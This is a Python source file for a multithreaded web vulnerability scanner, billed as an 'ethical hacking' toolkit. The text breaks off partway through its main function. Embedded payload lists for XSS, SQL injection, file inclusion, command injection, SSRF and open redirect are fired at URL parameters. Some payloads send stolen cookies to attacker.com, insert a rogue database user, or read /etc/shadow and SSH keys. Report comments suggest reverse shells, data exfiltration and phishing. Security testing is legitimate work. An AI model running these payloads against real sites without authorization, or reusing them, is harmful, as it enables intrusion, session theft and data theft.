#!/usr/bin/env python3
"""
EthicalRecon - Standalone Ethical Hacking Reconnaissance Toolkit
Single-file version with all payloads embedded - no external dependencies needed
Perfect for quick deployment on Kali Linux

Author: Security Research Team  
Version: 2.0.0 Standalone
License: MIT (For authorized security testing only)
"""

import argparse
import json
import sys
import time
import threading
import requests
import urllib3
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import re
import random
import string
from pathlib import Path
import hashlib
import base64

# Disable SSL warnings for security testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    """Terminal color codes for output formatting"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'

def print_banner():
    """Display the EthicalRecon ASCII banner"""
    banner = f"""{Colors.CYAN}
    ███████╗████████╗██╗  ██╗██╗ ██████╗ █████╗ ██╗     ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗
    ██╔════╝╚══██╔══╝██║  ██║██║██╔════╝██╔══██╗██║     ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║
    █████╗     ██║   ███████║██║██║     ███████║██║     ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║
    ██╔══╝     ██║   ██╔══██║██║██║     ██╔══██║██║     ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║
    ███████╗   ██║   ██║  ██║██║╚██████╗██║  ██║███████╗██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║
    ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝
                                                                                                      
    {Colors.YELLOW}🎯 Standalone Ethical Hacking Reconnaissance Toolkit v2.0.0{Colors.RESET}
    {Colors.GREEN}⚡ Multi-threaded vulnerability scanning with PoC verification{Colors.RESET}
    {Colors.BLUE}🔍 Subdomain enumeration → httpx → deep vulnerability analysis workflow{Colors.RESET}
    {Colors.PURPLE}🛡️  For authorized security testing and bug bounty research only{Colors.RESET}
    """
    print(banner)

class EmbeddedPayloads:
    """All vulnerability payloads embedded in the script"""
    
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "'><script>alert('XSS')</script>",
        "\"><script>alert('XSS')</script>",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<input onfocus=alert('XSS') autofocus>",
        "<svg/onload=alert('XSS')>",
        "';alert('XSS');//",
        "\";alert('XSS');//",
        "</textarea><script>alert('XSS')</script>",
        "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
        "<img src=x onerror=\"fetch('http://attacker.com/steal?c='+btoa(document.cookie))\">",
        "{{constructor.constructor('alert(1)')()}}",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "data:text/html,<script>alert('XSS')</script>",
        "<script>alert`XSS`</script>",
        "<script>eval('alert(\"XSS\")')</script>",
        "<IMG SRC=\"javascript:alert('XSS');\">"
    ]
    
    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "' AND (SELECT SLEEP(5))--",
        "'; WAITFOR DELAY '00:00:05'--",
        "' OR pg_sleep(5)--",
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "admin'--",
        "' or 1=1#",
        "') or '1'='1--",
        "' /*comment*/ OR /*comment*/ 1=1--",
        "' /*!50000OR*/ 1=1--",
        "'; INSERT INTO users VALUES('hacker','password')--",
        "' AND @@version--",
        "' AND user()--",
        "' AND database()--",
        "' OR IF(1=1,SLEEP(5),0)--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--"
    ]
    
    LFI_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "/etc/passwd",
        "/etc/shadow",
        "/proc/version",
        "/proc/cmdline",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "file:///etc/passwd",
        "expect://id",
        "zip://archive.zip#dir/file.txt",
        "/var/log/apache2/access.log",
        "/var/log/nginx/error.log",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Windows\\win.ini",
        "/WEB-INF/web.xml",
        "/META-INF/MANIFEST.MF",
        "../../../WEB-INF/web.xml",
        "/var/www/html/wp-config.php",
        "/home/user/.ssh/id_rsa",
        "/root/.bash_history",
        "/etc/mysql/my.cnf",
        "/etc/nginx/nginx.conf"
    ]
    
    RCE_PAYLOADS = [
        "; id",
        "| id", 
        "& id",
        "&& id",
        "|| id",
        "`id`",
        "$(id)",
        "; whoami",
        "| whoami",
        "&& whoami",
        "; uname -a",
        "| uname -a",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; ping -c 4 127.0.0.1",
        "| ping -c 4 127.0.0.1",
        "& dir",
        "&& dir",
        "| dir",
        "; sleep 5",
        "| sleep 5",
        "&& sleep 5",
        "& timeout 5",
        "&& timeout 5",
        "%3Bid",
        "%7Cid",
        "%26id",
        "; /bin/sh -c id",
        "| /bin/sh -c id",
        "; echo $USER"
    ]
    
    SSRF_PAYLOADS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://127.0.0.1:22",
        "http://localhost:3306",
        "http://192.168.1.1",
        "http://10.0.0.1",
        "http://172.16.0.1",
        "file:///etc/passwd",
        "gopher://127.0.0.1:3306",
        "dict://127.0.0.1:11211",
        "http://127.0.0.1:8080",
        "http://127.0.0.1:443",
        "http://169.254.169.254/metadata/instance",
        "http://metadata.google.internal/computeMetadata/v1/instance/",
        "ftp://127.0.0.1",
        "ldap://127.0.0.1:389",
        "http://127.1",
        "http://localhost.127.0.0.1.nip.io",
        "http://[::1]"
    ]
    
    REDIRECT_PAYLOADS = [
        "//evil.com",
        "http://evil.com", 
        "https://evil.com",
        "//evil.com/",
        "///evil.com",
        "\\\\evil.com",
        "http%3A%2F%2Fevil.com",
        "%2F%2Fevil.com",
        "javascript:window.location='http://evil.com'"
    ]

class VulnerabilityDetector:
    """Advanced vulnerability detection with PoC verification"""
    
    def __init__(self, session, timeout=10):
        self.session = session
        self.timeout = timeout
    
    def detect_xss(self, url, parameter, value):
        """Detect XSS vulnerabilities with PoC verification"""
        vulnerabilities = []
        
        for payload in EmbeddedPayloads.XSS_PAYLOADS[:10]:  # Test top 10 payloads
            try:
                test_url = self._inject_payload(url, parameter, payload)
                response = self.session.get(test_url, timeout=self.timeout, verify=False)
                
                # Check if payload is reflected in response
                if payload in response.text or payload.lower() in response.text.lower():
                    # Verify it's actually executable (not just reflected)
                    if self._verify_xss_execution(response.text, payload):
                        # Generate PoC
                        poc = self._generate_xss_poc(url, parameter, payload, response)
                        
                        vulnerabilities.append({
                            'type': 'XSS',
                            'severity': 'High',
                            'url': url,
                            'parameter': parameter,
                            'payload': payload,
                            'proof_of_concept': poc,
                            'confidence': 'High',
                            'description': 'Cross-Site Scripting vulnerability detected with verified execution'
                        })
                        
                        print(f"{Colors.RED}[XSS FOUND]{Colors.RESET} {url} - Parameter: {parameter}")
                        print(f"{Colors.YELLOW}[POC]{Colors.RESET} {poc['execution_proof']}")
                        break  # Found working payload, no need to test more
                        
            except Exception as e:
                continue
                
        return vulnerabilities
    
    def detect_sqli(self, url, parameter, value):
        """Detect SQL injection with time-based verification"""
        vulnerabilities = []
        
        for payload in EmbeddedPayloads.SQLI_PAYLOADS[:10]:  # Test top 10 payloads
            try:
                test_url = self._inject_payload(url, parameter, payload)
                
                start_time = time.time()
                response = self.session.get(test_url, timeout=15, verify=False)
                response_time = time.time() - start_time
                
                # Time-based detection for SLEEP/WAITFOR payloads
                if 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper():
                    if response_time >= 4:  # Expecting ~5 second delay
                        poc = self._generate_sqli_poc(url, parameter, payload, response_time)
                        
                        vulnerabilities.append({
                            'type': 'SQL Injection',
                            'severity': 'Critical',
                            'url': url,
                            'parameter': parameter,
                            'payload': payload,
                            'proof_of_concept': poc,
                            'confidence': 'High',
                            'description': 'Time-based SQL injection confirmed with delay verification'
                        })
                        
                        print(f"{Colors.RED}[SQLi FOUND]{Colors.RESET} {url} - Parameter: {parameter}")
                        print(f"{Colors.YELLOW}[POC]{Colors.RESET} Time delay: {response_time:.2f}s - {poc['execution_proof']}")
                        break
                
                # Error-based detection - STRICT verification
                elif self._verify_sql_error(response.text, payload):
                    poc = self._generate_sqli_poc(url, parameter, payload, response_time, response.text)
                    
                    vulnerabilities.append({
                        'type': 'SQL Injection',
                        'severity': 'Critical',
                        'url': url,
                        'parameter': parameter,
                        'payload': payload,
                        'proof_of_concept': poc,
                        'confidence': 'High',
                        'description': 'SQL injection confirmed through specific database error patterns'
                    })
                    
                    print(f"{Colors.RED}[SQLi FOUND]{Colors.RESET} {url} - Parameter: {parameter}")
                    print(f"{Colors.YELLOW}[POC]{Colors.RESET} SQL error confirmed - {poc['execution_proof']}")
                    break
                    
            except Exception as e:
                continue
                
        return vulnerabilities
    
    def detect_lfi(self, url, parameter, value):
        """Detect Local File Inclusion with file signature verification"""
        vulnerabilities = []
        
        for payload in EmbeddedPayloads.LFI_PAYLOADS[:10]:  # Test top 10 payloads
            try:
                test_url = self._inject_payload(url, parameter, payload)
                response = self.session.get(test_url, timeout=self.timeout, verify=False)
                
                # Check for common file signatures
                file_signatures = {
                    '/etc/passwd': ['root:', 'bin:', 'daemon:', '/bin/bash', '/bin/sh'],
                    'windows/system32': ['127.0.0.1', 'localhost', '# Copyright'],
                    '/proc/version': ['Linux version', 'gcc version'],
                    'php://filter': ['base64', 'PD9waHA']  # Base64 encoded PHP
                }
                
                for file_type, signatures in file_signatures.items():
                    if any(sig in response.text for sig in signatures):
                        poc = self._generate_lfi_poc(url, parameter, payload, response.text, file_type)
                        
                        vulnerabilities.append({
                            'type': 'Local File Inclusion',
                            'severity': 'High',
                            'url': url,
                            'parameter': parameter,
                            'payload': payload,
                            'proof_of_concept': poc,
                            'confidence': 'High',
                            'description': f'LFI confirmed - successfully read {file_type}'
                        })
                        
                        print(f"{Colors.RED}[LFI FOUND]{Colors.RESET} {url} - Parameter: {parameter}")
                        print(f"{Colors.YELLOW}[POC]{Colors.RESET} File read: {file_type} - {poc['execution_proof']}")
                        return vulnerabilities  # Found one, return to avoid duplicates
                        
            except Exception as e:
                continue
                
        return vulnerabilities
    
    def detect_rce(self, url, parameter, value):
        """Detect Remote Code Execution with command output verification"""
        vulnerabilities = []
        
        # Generate unique marker for verification
        unique_marker = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        
        rce_payloads = [
            f"; echo {unique_marker}",
            f"| echo {unique_marker}",
            f"& echo {unique_marker}",
            f"&& echo {unique_marker}",
            f"`echo {unique_marker}`",
            f"$(echo {unique_marker})",
        ]
        
        for payload in rce_payloads:
            try:
                test_url = self._inject_payload(url, parameter, payload)
                response = self.session.get(test_url, timeout=self.timeout, verify=False)
                
                # Check if our unique marker appears in response
                if unique_marker in response.text:
                    poc = self._generate_rce_poc(url, parameter, payload, response.text, unique_marker)
                    
                    vulnerabilities.append({
                        'type': 'Remote Code Execution',
                        'severity': 'Critical',
                        'url': url,
                        'parameter': parameter,
                        'payload': payload,
                        'proof_of_concept': poc,
                        'confidence': 'High',
                        'description': 'RCE confirmed with command execution verification'
                    })
                    
                    print(f"{Colors.RED}[RCE FOUND]{Colors.RESET} {url} - Parameter: {parameter}")
                    print(f"{Colors.YELLOW}[POC]{Colors.RESET} Command executed - {poc['execution_proof']}")
                    return vulnerabilities  # Critical finding, return immediately
                    
            except Exception as e:
                continue
                
        return vulnerabilities
    
    def detect_ssrf(self, url, parameter, value):
        """Detect SSRF with external callback verification"""
        vulnerabilities = []
        
        for payload in EmbeddedPayloads.SSRF_PAYLOADS[:10]:  # Test top 10 payloads
            try:
                test_url = self._inject_payload(url, parameter, payload)
                
                start_time = time.time()
                response = self.session.get(test_url, timeout=self.timeout, verify=False)
                response_time = time.time() - start_time
                
                # Check for cloud metadata indicators
                cloud_indicators = [
                    'ami-id', 'instance-id', 'local-hostname', 'public-hostname',
                    'security-groups', 'iam', 'user-data', 'meta-data'
                ]
                
                if any(indicator in response.text.lower() for indicator in cloud_indicators):
                    poc = self._generate_ssrf_poc(url, parameter, payload, response.text)
                    
                    vulnerabilities.append({
                        'type': 'Server-Side Request Forgery',
                        'severity': 'High',
                        'url': url,
                        'parameter': parameter,
                        'payload': payload,
                        'proof_of_concept': poc,
                        'confidence': 'High',
                        'description': 'SSRF confirmed - accessed cloud metadata service'
                    })
                    
                    print(f"{Colors.RED}[SSRF FOUND]{Colors.RESET} {url} - Parameter: {parameter}")
                    print(f"{Colors.YELLOW}[POC]{Colors.RESET} Metadata access - {poc['execution_proof']}")
                    break
                    
                # Check for specific internal service responses - STRICT verification
                elif self._verify_ssrf_response(response.text, payload, response_time):
                    poc = self._generate_ssrf_poc(url, parameter, payload, f"Internal service confirmed: {response.status_code}")
                    
                    vulnerabilities.append({
                        'type': 'Server-Side Request Forgery',
                        'severity': 'High',
                        'url': url,
                        'parameter': parameter,
                        'payload': payload,
                        'proof_of_concept': poc,
                        'confidence': 'High',
                        'description': 'SSRF confirmed - internal service response detected'
                    })
                    
                    print(f"{Colors.RED}[SSRF FOUND]{Colors.RESET} {url} - Parameter: {parameter}")
                    print(f"{Colors.YELLOW}[POC]{Colors.RESET} Internal service confirmed - {poc['execution_proof']}")
                    break
            except Exception as e:
                continue
                
        return vulnerabilities
    
    def detect_open_redirect(self, url, parameter, value):
        """Detect open redirect vulnerabilities"""
        vulnerabilities = []
        
        for payload in EmbeddedPayloads.REDIRECT_PAYLOADS[:5]:  # Test top 5 payloads
            try:
                test_url = self._inject_payload(url, parameter, payload)
                response = self.session.get(test_url, timeout=self.timeout, verify=False, allow_redirects=False)
                
                # Check for redirect response codes
                if response.status_code in [301, 302, 303, 307, 308]:
                    location = response.headers.get('Location', '')
                    
                    if 'evil.com' in location or payload in location:
                        poc = self._generate_redirect_poc(url, parameter, payload, location)
                        
                        vulnerabilities.append({
                            'type': 'Open Redirect',
                            'severity': 'Medium',
                            'url': url,
                            'parameter': parameter,
                            'payload': payload,
                            'proof_of_concept': poc,
                            'confidence': 'High',
                            'description': 'Open redirect confirmed - redirects to external domain'
                        })
                        
                        print(f"{Colors.YELLOW}[REDIRECT FOUND]{Colors.RESET} {url} - Parameter: {parameter}")
                        print(f"{Colors.YELLOW}[POC]{Colors.RESET} Redirects to: {location}")
                        break
                        
            except Exception as e:
                continue
                
        return vulnerabilities
    
    def _inject_payload(self, url, parameter, payload):
        """Inject payload into URL parameter"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        
        if parameter in params:
            params[parameter] = [payload]
        else:
            params[parameter] = [payload]
        
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))
    
    def _verify_xss_execution(self, response_text, payload):
        """Verify if XSS payload would actually execute - STRICT verification"""
        # Only flag if payload is in truly executable context
        
        # 1. Check if payload is inside script tags
        script_context = re.search(r'<script[^>]*>.*?' + re.escape(payload) + r'.*?</script>', response_text, re.IGNORECASE | re.DOTALL)
        if script_context:
            return True
            
        # 2. Check if payload is in event handlers (onclick, onload, etc.)
        event_context = re.search(r'<[^>]+on\w+=[\'"]?[^>]*' + re.escape(payload) + r'[^>]*[\'"]?[^>]*>', response_text, re.IGNORECASE)
        if event_context:
            return True
            
        # 3. Check if payload creates new executable tags (script, svg with onload)
        if '<script' in payload.lower() and payload in response_text:
            # Verify the script tag is not HTML encoded
            if '&lt;script' not in response_text.lower() and '&gt;' not in response_text:
                return True
                
        if '<svg' in payload.lower() and 'onload' in payload.lower() and payload in response_text:
            # Verify the svg tag is not HTML encoded  
            if '&lt;svg' not in response_text.lower() and '&gt;' not in response_text:
                return True
        
        # 4. Check javascript: protocol in href/src attributes
        if 'javascript:' in payload.lower() and payload in response_text:
            js_context = re.search(r'(?:href|src)=[\'"]?' + re.escape(payload), response_text, re.IGNORECASE)
            if js_context:
                return True
        
        # REMOVED: The overly broad reflection check that caused false positives
        return False
    
    def _verify_sql_error(self, response_text, payload):
        """Verify if response contains actual SQL injection error patterns - STRICT verification"""
        response_lower = response_text.lower()
        
        # Specific SQL error patterns that indicate actual injection
        sql_error_patterns = [
            # MySQL specific errors
            r"you have an error in your sql syntax.*near.*" + re.escape(payload.lower()),
            r"unknown column.*" + re.escape(payload.lower()) + r".*in.*field list",
            r"table.*doesn't exist.*" + re.escape(payload.lower()),
            
            # PostgreSQL specific errors  
            r"syntax error at or near.*" + re.escape(payload.lower()),
            r"column.*" + re.escape(payload.lower()) + r".*does not exist",
            
            # SQL Server specific errors
            r"incorrect syntax near.*" + re.escape(payload.lower()),
            r"invalid column name.*" + re.escape(payload.lower()),
            
            # Oracle specific errors
            r"ora-00904.*" + re.escape(payload.lower()) + r".*invalid identifier",
            r"ora-00933.*sql command not properly ended",
            
            # Generic but specific patterns
            r"quoted string not properly terminated.*" + re.escape(payload.lower()),
            r"unclosed quotation mark.*" + re.escape(payload.lower())
        ]
        
        # Check if any specific SQL error pattern matches
        for pattern in sql_error_patterns:
            if re.search(pattern, response_lower, re.IGNORECASE):
                return True
        
        # Additional verification: payload must be clearly visible in error message
        # This prevents false positives from generic database documentation
        if any(word in response_lower for word in ['syntax error', 'sql syntax']) and payload.lower() in response_lower:
            # Verify the error is actually about our injected payload
            if len(payload) > 3 and payload.lower() in response_lower:
                return True
                
        return False
    
    def _verify_ssrf_response(self, response_text, payload, response_time):
        """Verify if response indicates actual SSRF vulnerability - STRICT verification"""
        response_lower = response_text.lower()
        
        # Only flag if we have clear evidence of internal service access
        
        # 1. SSH service responses
        if 'ssh-' in response_lower and 'openssh' in response_lower:
            return True
            
        # 2. HTTP server responses from internal services
        internal_service_indicators = [
            'apache default page',
            'nginx default page', 
            'iis default page',
            'it works!',
            'welcome to nginx',
            'apache2 ubuntu default page'
        ]
        
        if any(indicator in response_lower for indicator in internal_service_indicators):
            return True
            
        # 3. Database service responses
        database_banners = [
            'mysql server',
            'postgresql server',
            'mongodb server', 
            'redis server'
        ]
        
        if any(banner in response_lower for banner in database_banners):
            return True
            
        # 4. Internal application responses (only if payload is clearly reflected)
        if ('127.0.0.1' in payload or 'localhost' in payload) and payload in response_text:
            # Look for specific internal service patterns
            if any(pattern in response_lower for pattern in [
                'connection refused',
                'internal server error',
                'service unavailable', 
                'bad gateway'
            ]) and len(response_text) < 5000:  # Keep response size reasonable
                return True
        
        # REMOVED: The overly broad time/size checks that caused false positives
        return False
    
    def _generate_xss_poc(self, url, parameter, payload, response):
        """Generate XSS proof of concept"""
        return {
            'attack_vector': f"{url} with {parameter}={payload}",
            'execution_proof': f"Payload '{payload}' reflected in executable context",
            'impact': 'Cookie theft, session hijacking, defacement possible',
            'curl_command': f"curl -X GET '{self._inject_payload(url, parameter, payload)}'",
            'browser_test': f"Visit: {self._inject_payload(url, parameter, payload)}"
        }
    
    def _generate_sqli_poc(self, url, parameter, payload, response_time, error_text=''):
        """Generate SQL injection proof of concept"""
        if error_text:
            proof = f"Database error revealed: {error_text[:100]}..."
        else:
            proof = f"Time-based injection confirmed with {response_time:.2f}s delay"
        
        return {
            'attack_vector': f"{url} with {parameter}={payload}",
            'execution_proof': proof,
            'impact': 'Database access, data extraction, potential RCE',
            'curl_command': f"curl -X GET '{self._inject_payload(url, parameter, payload)}'",
            'exploitation_note': 'Use sqlmap for automated exploitation'
        }
    
    def _generate_lfi_poc(self, url, parameter, payload, response_text, file_type):
        """Generate LFI proof of concept"""
        file_content = response_text[:200] + "..." if len(response_text) > 200 else response_text
        
        return {
            'attack_vector': f"{url} with {parameter}={payload}",
            'execution_proof': f"Successfully read {file_type}",
            'file_content_sample': file_content,
            'impact': 'Sensitive file access, potential code execution',
            'curl_command': f"curl -X GET '{self._inject_payload(url, parameter, payload)}'",
            'exploitation_note': 'Try log poisoning or PHP wrappers for RCE'
        }
    
    def _generate_rce_poc(self, url, parameter, payload, response_text, marker):
        """Generate RCE proof of concept"""
        return {
            'attack_vector': f"{url} with {parameter}={payload}",
            'execution_proof': f"Command executed - unique marker '{marker}' found in response",
            'command_output': response_text,
            'impact': 'Complete system compromise possible',
            'curl_command': f"curl -X GET '{self._inject_payload(url, parameter, payload)}'",
            'exploitation_note': 'Use for reverse shell or data exfiltration'
        }
    
    def _generate_ssrf_poc(self, url, parameter, payload, response_info):
        """Generate SSRF proof of concept"""
        return {
            'attack_vector': f"{url} with {parameter}={payload}",
            'execution_proof': f"SSRF confirmed: {response_info}",
            'impact': 'Internal network access, cloud metadata exposure',
            'curl_command': f"curl -X GET '{self._inject_payload(url, parameter, payload)}'",
            'exploitation_note': 'Explore internal services and cloud instances'
        }
    
    def _generate_redirect_poc(self, url, parameter, payload, location):
        """Generate open redirect proof of concept"""
        return {
            'attack_vector': f"{url} with {parameter}={payload}",
            'execution_proof': f"Redirects to: {location}",
            'impact': 'Phishing attacks, session fixation',
            'curl_command': f"curl -I '{self._inject_payload(url, parameter, payload)}'",
            'exploitation_note': 'Use for phishing campaigns'
        }

class EthicalReconScanner:
    """Main scanner class for comprehensive vulnerability assessment"""
    
    def __init__(self, threads=10, timeout=10, user_agent=None):
        self.threads = threads
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': user_agent or 'EthicalRecon/2.0.0 (Security Scanner)',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        
        self.detector = VulnerabilityDetector(self.session, timeout)
        self.results = []
        self.stats = {
            'total_urls': 0,
            'scanned_urls': 0,
            'vulnerabilities_found': 0,
            'start_time': None,
            'end_time': None
        }
    
    def scan_url(self, url):
        """Scan a single URL for vulnerabilities"""
        vulnerabilities = []
        
        try:
            print(f"{Colors.BLUE}[SCANNING]{Colors.RESET} {url}")
            
            # Parse URL and extract parameters
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            
            if not params:
                print(f"{Colors.YELLOW}[SKIPPED]{Colors.RESET} No parameters found in {url}")
                return vulnerabilities
            
            # Test each parameter
            for param, values in params.items():
                original_value = values[0] if values else ''
                
                print(f"  {Colors.CYAN}Testing parameter:{Colors.RESET} {param}")
                
                # Test for different vulnerability types
                vuln_tests = [
                    ('XSS', self.detector.detect_xss),
                    ('SQL Injection', self.detector.detect_sqli),
                    ('LFI', self.detector.detect_lfi),
                    ('RCE', self.detector.detect_rce),
                    ('SSRF', self.detector.detect_ssrf),
                    ('Open Redirect', self.detector.detect_open_redirect)
                ]
                
                for vuln_name, test_func in vuln_tests:
                    try:
                        found_vulns = test_func(url, param, original_value)
                        vulnerabilities.extend(found_vulns)
                        
                        if found_vulns:
                            self.stats['vulnerabilities_found'] += len(found_vulns)
                            
                    except Exception as e:
                        continue  # Silently continue on error
            
            self.stats['scanned_urls'] += 1
            
        except Exception as e:
            print(f"{Colors.RED}[ERROR]{Colors.RESET} Scanning {url}: {str(e)}")
        
        return vulnerabilities
    
    def scan_from_file(self, file_path):
        """Scan URLs from a file (compatible with httpx output)"""
        print(f"{Colors.GREEN}[INFO]{Colors.RESET} Loading URLs from {file_path}")
        
        try:
            with open(file_path, 'r') as f:
                urls = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
            
            print(f"{Colors.GREEN}[INFO]{Colors.RESET} Loaded {len(urls)} URLs")
            self.stats['total_urls'] = len(urls)
            self.stats['start_time'] = datetime.now()
            
            # Multi-threaded scanning
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                future_to_url = {executor.submit(self.scan_url, url): url for url in urls}
                
                for future in as_completed(future_to_url):
                    url = future_to_url[future]
                    try:
                        vulnerabilities = future.result()
                        self.results.extend(vulnerabilities)
                    except Exception as e:
                        print(f"{Colors.RED}[ERROR]{Colors.RESET} Processing {url}: {str(e)}")
            
            self.stats['end_time'] = datetime.now()
            
        except FileNotFoundError:
            print(f"{Colors.RED}[ERROR]{Colors.RESET} File not found: {file_path}")
            sys.exit(1)
        except Exception as e:
            print(f"{Colors.RED}[ERROR]{Colors.RESET} Reading file {file_path}: {str(e)}")
            sys.exit(1)
    
    def scan_single_url(self, url):
        """Scan a single URL"""
        print(f"{Colors.GREEN}[INFO]{Colors.RESET} Scanning single URL: {url}")
        
        self.stats['total_urls'] = 1
        self.stats['start_time'] = datetime.now()
        
        vulnerabilities = self.scan_url(url)
        self.results.extend(vulnerabilities)
        
        self.stats['end_time'] = datetime.now()
    
    def generate_report(self, output_file, format_type='json'):
        """Generate vulnerability report"""
        
        report_data = {
            'scan_info': {
                'tool': 'EthicalRecon v2.0.0 Standalone',
                'start_time': self.stats['start_time'].isoformat() if self.stats['start_time'] else None,
                'end_time': self.stats['end_time'].isoformat() if self.stats['end_time'] else None,
                'duration': str(self.stats['end_time'] - self.stats['start_time']) if self.stats['start_time'] and self.stats['end_time'] else None,
                'total_urls': self.stats['total_urls'],
                'scanned_urls': self.stats['scanned_urls'],
                'vulnerabilities_found': self.stats['vulnerabilities_found']
            },
            'vulnerabilities': self.results
        }
        
        if format_type == 'json':
            with open(output_file, 'w') as f:
                json.dump(report_data, f, indent=2)
        
        elif format_type == 'text':
            self._generate_text_report(report_data, output_file)
        
        print(f"{Colors.GREEN}[REPORT]{Colors.RESET} Saved to {output_file}")
    
    def _generate_text_report(self, data, output_file):
        """Generate text report"""
        with open(output_file, 'w') as f:
            f.write("=" * 60 + "\n")
            f.write("ETHICALRECON SECURITY ASSESSMENT REPORT\n")
            f.write("=" * 60 + "\n\n")
            
            f.write("SCAN STATISTICS:\n")
            f.write("-" * 20 + "\n")
            f.write(f"Total URLs: {data['scan_info']['total_urls']}\n")
            f.write(f"Scanned URLs: {data['scan_info']['scanned_urls']}\n")
            f.write(f"Vulnerabilities Found: {data['scan_info']['vulnerabilities_found']}\n")
            f.write(f"Scan Duration: {data['scan_info']['duration']}\n\n")
            
            f.write("VULNERABILITIES FOUND:\n")
            f.write("-" * 25 + "\n\n")
            
            for i, vuln in enumerate(data['vulnerabilities'], 1):
                f.write(f"[{i}] {vuln['type']} - {vuln['severity']} Severity\n")
                f.write(f"URL: {vuln['url']}\n")
                f.write(f"Parameter: {vuln['parameter']}\n")
                f.write(f"Description: {vuln['description']}\n")
                f.write(f"Confidence: {vuln['confidence']}\n")
                f.write(f"Payload: {vuln['payload']}\n\n")
                
                f.write("PROOF OF CONCEPT:\n")
                f.write(f"Attack Vector: {vuln['proof_of_concept']['attack_vector']}\n")
                f.write(f"Execution Proof: {vuln['proof_of_concept']['execution_proof']}\n")
                f.write(f"Impact: {vuln['proof_of_concept']['impact']}\n")
                f.write(f"cURL Command: {vuln['proof_of_concept']['curl_command']}\n")
                f.write("\n" + "=" * 60 + "\n\n")

def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description='EthicalRecon - Standalone Ethical Hacking Reconnaissance Toolkit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 ethicalrecon_standalone.py -f live_hosts.txt -o results
  python3 ethicalrecon_standalone.py -u "http://example.com/search?q=test" -o single_scan
  python3 ethicalrecon_standalone.py -f httpx_output.txt -t 20 --format json
  python3 ethicalrecon_standalone.py -f subdomains.txt --timeout 15
        """
    )
    
    # Input options
    input_group = parser.add_mutually_exclusive_group(required=True)
    input_group.add_argument('-f', '--file', help='File containing URLs to scan (one per line)')
    input_group.add_argument('-u', '--url', help='Single URL to scan')
    
    # Output options
    parser.add_argument('-o', '--output', default='ethicalrecon_results', 
                        help='Output directory for results (default: ethicalrecon_results)')
    parser.add_argument('--format', default='json,text', 
                        help='Output formats: json,text (default: json,text)')
    
    # Scanning options
    parser.add_argument('-t', '--threads', type=int, default=10,
                        help='Number of threads (default: 10)')
    parser.add_argument('--timeout', type=int, default=10,
                        help='Request timeout in seconds (default: 10)')
    parser.add_argument('--user-agent', 
                        help='Custom User-Agent string')
    
    # Utility options
    parser.add_argument('--no-banner', action='store_true',
                        help='Suppress banner output')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Verbose output')
    
    args = parser.parse_args()
    
    # Print banner
    if not args.no_banner:
        print_banner()
    
    # Create output directory
    output_dir = Path(args.output)
    output_dir.mkdir(exist_ok=True)
    
    # Initialize scanner
    scanner = EthicalReconScanner(
        threads=args.threads,
        timeout=args.timeout,
        user_agent=args.user_agent
    )
    
    # Start scanning
    print(f"{Colors.GREEN}[INFO]{Colors.RESET} Starting EthicalRecon scan...")
    
    if args.file:
        scanner.scan_from_file(args.file)
    else:
        scanner.scan_single_url(args.url)
    
    # Generate reports
    if scanner.results:
        print(f"\n{Colors.GREEN}[SUCCESS]{Colors.RESET} Found {len(scanner.results)} vulnerabilities!")
        
